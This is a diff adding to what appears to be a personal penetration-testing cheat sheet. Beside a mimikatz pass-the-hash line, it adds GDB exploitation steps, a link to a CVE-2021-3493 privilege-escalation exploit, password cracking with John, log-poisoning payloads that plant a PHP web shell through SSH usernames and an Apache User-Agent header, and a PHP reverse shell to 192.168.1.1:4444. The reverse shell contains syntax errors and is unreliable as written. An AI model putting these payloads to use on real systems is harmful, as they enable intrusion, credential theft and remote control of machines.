@@ -45,9 +45,44 @@ sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>
 ## GDB 
 # Install Plgu-in  
 # Commands  
-gdb bash
-b main
-run 
-info registers
+gdb XXXX(binary name)  
+b main  
+run  
+info registers  
 disassemble main  
+p system
+search /bin/sh  
 
+## Privilege Escalation  
+# Overlay  
+https://github.com/briskets/CVE-2021-3493  
+
+
+## Firmware Analyze  
+# binwalk  
+binwalk -e --signature --term (Filename)  
+# binwalk3  
+binwalk3  
+# firmware analysis toolkit(fat)  
+sudo ./fat3.py (filename)  
+# AttifyOS Emulation  
+
+## Hash Cracker  
+# John  
+john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>  
+# Hashcat  
+
+## Web Recon  
+# Nikto  
+# wpscan  
+
+## Log Poison  
+# SSH Log (/var/log/auth.log)  
+ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1
+ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1
+# Apache Log (/var/log/apache2/access.log)  
+User-Agent: <?php system($_GET['cmd']); ?>
+
+## Reverse Shell
+# php
+``` php -r '$sock=fsockopen("192.168.1.1",4444);$proc=proc_open("/bin/sh -i", array(0>=$sock, 1=>$sock, 2=>sock),$pipes);' ```
